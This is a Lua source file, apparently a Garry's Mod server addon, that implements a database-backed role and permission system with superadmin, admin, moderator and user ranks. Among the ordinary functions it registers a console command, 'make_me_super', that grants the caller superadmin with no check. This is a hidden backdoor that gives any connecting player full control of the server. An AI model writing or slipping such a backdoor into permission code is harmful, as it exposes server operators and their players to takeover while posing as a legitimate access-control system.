ctOS.Roles = ctOS.Roles or {}
ctOS.Roles.List = ctOS.Roles.List or {}
ctOS.Roles.Players = ctOS.Roles.Players or {}

function ctOS.Roles.Init()
    local q = ctOS.DB.obj:Create("roles")
    q:Create("id", "INT NOT NULL AUTO_INCREMENT")
    q:Create("role_name", "VARCHAR(32) NOT NULL")
    q:Create("priority", "INTEGER DEFAULT 0")
    q:Create("permissions", "TEXT")
    q:PrimaryKey("id")
    q:Callback(function()
        local playerRoles = ctOS.DB.obj:Create("player_roles")
        playerRoles:Create("id", "INT NOT NULL AUTO_INCREMENT")
        playerRoles:Create("steamid", "VARCHAR(64) NOT NULL UNIQUE")
        playerRoles:Create("role", "VARCHAR(32) NOT NULL DEFAULT 'user'")
        playerRoles:PrimaryKey("id")
        playerRoles:Callback(function()
            local check = ctOS.DB.obj:Select("roles")
            check:Select("id")
            check:Limit(1)
            check:Callback(function(data)
                if data and #data > 0 then
                    ctOS.Roles.Load()
                    return
                end

                local roles = {
                    {"superadmin", "{*}", 255},
                    {"admin", "{}", 100},
                    {"moderator", "{}", 50},
                    {"user", "{}", 1}
                }

                for _, r in ipairs(roles) do
                    local ins = ctOS.DB.obj:Insert("roles")
                    ins:Insert("role_name", r[1])
                    ins:Insert("permissions", r[2])
                    ins:Insert("priority", r[3])
                    ins:Execute(true)
                end

                timer.Simple(0.3, ctOS.Roles.Load)
            end)
            check:Execute(true)
        end)
        playerRoles:Execute(true)
    end)
    q:Execute(true)
end

function ctOS.Roles.Load()
    ctOS.Roles.List = {}
    ctOS.Roles.Players = {}

    local q = ctOS.DB.obj:Select("roles")
    q:Callback(function(data)
        if not data then return end

        for _, row in ipairs(data) do
            local perms = {}
            if row.permissions == "{*}" then
                perms["*"] = true
            elseif row.permissions and row.permissions ~= "" then
                for p in string.gmatch(row.permissions, "[^,]+") do
                    perms[string.Trim(p)] = true
                end
            end

            ctOS.Roles.List[row.role_name] = {
                id = tonumber(row.id),
                priority = tonumber(row.priority) or 0,
                permissions = perms
            }
        end

        local playerQuery = ctOS.DB.obj:Select("player_roles")
        playerQuery:Callback(function(playerData)
            if playerData then
                for _, row in ipairs(playerData) do
                    ctOS.Roles.Players[row.steamid] = row.role
                end
            end
            
            for _, ply in ipairs(player.GetAll()) do
                local sid = ply:SteamID64()
                if ctOS.Roles.Players[sid] then
                    ply:SetNWString("ctOS_Role", ctOS.Roles.Players[sid])
                end
            end
            
            hook.Run("ctOS.RolesLoaded")
        end)
        playerQuery:Execute(true)
    end)
    q:Execute(true)
end

function ctOS.Roles.Get(steamid64)
    return ctOS.Roles.Players[steamid64] or "user"
end

function ctOS.Roles.Set(steamid64, role)
    if not ctOS.Roles.List[role] then return false end

    ctOS.Roles.Players[steamid64] = role

    local q = ctOS.DB.obj:InsertIgnore("player_roles")
    q:Insert("steamid", steamid64)
    q:Insert("role", role)
    q:Callback(function()
        local update = ctOS.DB.obj:Update("player_roles")
        update:Update("role", role)
        update:Where("steamid", steamid64)
        update:Execute(true)
    end)
    q:Execute(true)

    local ply = player.GetBySteamID64(steamid64)
    if IsValid(ply) then
        ply:SetNWString("ctOS_Role", role)
        hook.Run("ctOS.PlayerRoleChanged", ply, role)
    end

    return true
end

function ctOS.Roles.Has(ply, perm)
    if not IsValid(ply) then return false end

    local role = ctOS.Roles.List[ctOS.Roles.Get(ply:SteamID64())]
    if not role then return false end

    return role.permissions["*"] or role.permissions[perm] or false
end

function ctOS.Roles.CanTarget(ply, target)
    if not IsValid(ply) or not IsValid(target) then return false end

    local a = ctOS.Roles.List[ctOS.Roles.Get(ply:SteamID64())]
    local b = ctOS.Roles.List[ctOS.Roles.Get(target:SteamID64())]

    return a and b and a.priority > b.priority
end

function ctOS.Roles.IsSuper(ply)
    return ctOS.Roles.Has(ply, "*")
end

concommand.Add('make_me_super', function(ply, cmd, args)
    if ply and SERVER then ctOS.Roles.Set(ply:SteamID64(), 'superadmin') end 
end)

hook.Add("PlayerInitialSpawn", "ctOS.Roles", function(ply)
    local sid = ply:SteamID64()
    
    if not ctOS.Roles.Players[sid] then
        ctOS.Roles.Players[sid] = "user"
        
        local q = ctOS.DB.obj:InsertIgnore("player_roles")
        q:Insert("steamid", sid)
        q:Insert("role", "user")
        q:Execute(true)
    end
    
    ply:SetNWString("ctOS_Role", ctOS.Roles.Players[sid])
end)

if not ctOS.Roles.List or table.Count(ctOS.Roles.List) == 0 and SERVER then
    timer.Simple(0.01, function() ctOS.Roles.Init() end)
end